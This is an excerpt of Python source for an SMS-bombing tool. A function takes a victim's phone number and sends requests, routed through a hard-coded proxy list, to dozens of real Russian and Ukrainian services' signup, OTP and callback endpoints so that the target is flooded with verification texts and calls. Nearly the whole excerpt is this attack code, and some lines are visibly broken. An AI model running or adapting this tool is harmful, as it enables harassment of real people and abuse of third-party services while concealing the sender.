...
proxies = {
 "https": "178.128.158.205:3128",
 "https": "64.235.204.107:8080",
 "https": "162.245.81.151:8811",
 "http":  "3.14.85.84:80"
}
...
def send_for_number(phone):
    ...
    try:
        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', proxies=proxies, data={'l': _phone9}).json()["res"]
        print('[+] RuTaxi отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://belkacar.ru/get-confirmation-code', proxies=proxies , data={'phone': _phone}, headers={})
        print('[+] BelkaCar отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', proxies=proxies ,
    ...
    try:
        requests.post('https://app.karusel.ru/api/v1/phone/', proxies=proxies, data={'phone': _phone}, headers={})
        print('[+] Karusel отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.tinkoff.ru/v1/sign_up',  proxies=proxies, data={'phone': '+' + _phone}, headers={})
        print('[+] Tinkoff отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.mtstv.ru/v1/users', proxies=proxies, json={'msisdn': _phone}, headers={})
        print('[+] MTS отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://youla.ru/web-api/auth/request_code', proxies=proxies, data={'phone': _phone})
        print('[+] Youla отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://pizzahut.ru/account/password-reset', proxies=proxies,
    ...
    try:
        requests.post('https://www.rabota.ru/remind', proxies=proxies, data={'credential': _phone})
        print('[+] Rabota отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://rutube.ru/api/accounts/sendpass/phone', proxies=proxies, data={'phone': '+' + _phone})
        print('[+] Rutube отправлено!')
    except:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+', proxies=proxies + _phone + '/')
        print('[+] Citilink отправлено!')

    try:
        requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', proxies=proxies ,
    ...
    try:
        requests.get(
            'https://www.oyorooms.com/api/pwa/generateotp?phone=', proxies=proxies + _phone9 + '&country_code=%2B7&nod=4&locale=en')
        print('[+] oyorooms отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', proxies=proxies,
    ...
    try:
        requests.post('https://newnext.ru/graphql', proxies=proxies, json={'operationName': 'registration', 'variables': {
    ...
    try:
        requests.post('https://api.sunlight.net/v3/customers/authorization/',proxies=proxies, data={'phone': _phone})
        print('[+] Sunlight отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', proxies=proxies,
    ...
    try:
        requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', proxies=proxies, data={'phone': _phone})
        print('[+] Invitro отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://online.sbis.ru/reg/service/', proxies=proxies,
    ...
    try:
        requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', proxies=proxies,
    ...
    try:
        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', proxies=proxies, data={'phone': _phone})
        print('[+] Beltelcom отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://app.karusel.ru/api/v1/phone/', proxies=proxies, data={'phone': _phone})
        print('[+] Karusel отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', proxies=proxies, json={'phone': '+' + _phone})
        print('[+] KFC отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://api.carsmile.com/", proxies=proxies, json={"operationName": "enterPhone", "variables": {"phone": _phone},
    ...
    try:
        requests.post("https://api.delitime.ru/api/v2/signup", proxies=proxies,
    ...
    try:
        requests.get('https://findclone.ru/register', proxies=proxies, params={'phone': '+' + _phone})
        print('[+] findclone звонок отправлен!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://guru.taxi/api/v1/driver/session/verify", proxies=proxies, json={"phone": {"code": 1, "number": _phone}})
        print('[+] Guru отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', proxies=proxies,
    ...
    try:
        requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru", proxies=proxies,
    ...
    try:
        requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", proxies=proxies,
    ...
    try:
        requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', proxies=proxies, json={"phone": _phone})
        print('[+] Pmsm отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", proxies=proxies, data={"phone": _phone})
        print('[+] IVI отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', proxies=proxies,
    ...
    try:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink', proxies=proxies,
    ...
    try:
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode', proxies=proxies,
    ...
    try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", proxies=proxies,
    ...
    try:
        requests.post('https://plink.tech/register/', proxies=proxies, json={"phone": _phone})
        print('[+] Plink отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", proxies=proxies, json={"phone": _phone})
        print('[+] qlean отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post("http://smsgorod.ru/sendsms.php", proxies=proxies, data={"number": _phone})
    ...
    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true', proxies=proxies,
    ...
    try:
        requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms, proxies=proxies', data={'msisdn': _phone},
    ...
    try:
        requests.post("https://api.wowworks.ru/v2/site/send-code", proxies=proxies, json={"phone": _phone, "type": 2})
        print('[+] wowworks отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://eda.yandex/api/v1/user/request_authentication_code', proxies=proxies, json={"phone_number": "+" + _phone})
    ...
    try:
        requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", proxies=proxies, data={"phone": _phone})
        print('[+] SMS отправлено!')
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://www.delivery-club.ru/ajax/user_otp', proxies=proxies, data={"phone": _phone})
    ...
    try:
        requests.post('https://belkacar.ru/get-confirmation-code', proxies=proxies, data={'phone': _phone})
    except:
        pass
    ...
    try:
        requests.post('https://pampik.com/callback', proxies=proxies, data={'phoneCallback': _phone})
        print('[+] Pampik отправлено!')
    except:
        print('[-] Pampik Не отправлено!')

    try:
        requests.post('https://tehnosvit.ua/iwantring_feedback.html', proxies=proxies,
    ...
    try:
        requests.post('https://mobileplanet.ua/register', proxies=proxies,
    ...
    try:
        requests.post('https://e-vse.online/mail2.php', proxies=proxies, data={'telephone': '+' + _phone})
        print('[+] E-vse отправлено!')
    except:
        print('[-] E-vse Не отправлено!')

    try:
        requests.post('https://protovar.com.ua/aj_record', proxies=proxies,
    ...
    try:
        requests.post('https://kasta.ua/api/v2/login/', proxies=proxies, data={"phone": _phone})
        print('[+] Kasta отправлено!')
    except:
        print('[-] Kasta Не отправлено!')

    try:
        requests.post('https://allo.ua/ua/customer/account/createPostVue/?currentTheme=main&currentLocale=uk_UA', proxies=proxies,
    ...
    try:
        requests.post('https://secure.online.ua/ajax/check_phone/?reg_phone=%2B', proxies=proxies + _phone[0:7] + '-' + _phone[8:11])
        print('[+] OnloneUA отправлено!')
    except:
        print('[-] OnloneUA Не отправлено!')

    try:
        requests.post('https://707taxi.com.ua/sendSMS.php', proxies=proxies, data={'tel': _phone[3:]})
    ...
    try:
        requests.post('https://comfy.ua/ua/customer/account/createPost', proxies=proxies,
    ...
    try:
        requests.post('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20669-16-10', proxies=proxies,
                      data={"result": "ok"})
    ...
    try:
        requests.post('https://my.citrus.ua/api/v2/register', proxies=proxies,
    ...
    try:
        requests.post('https://www.nl.ua', proxies=proxies,
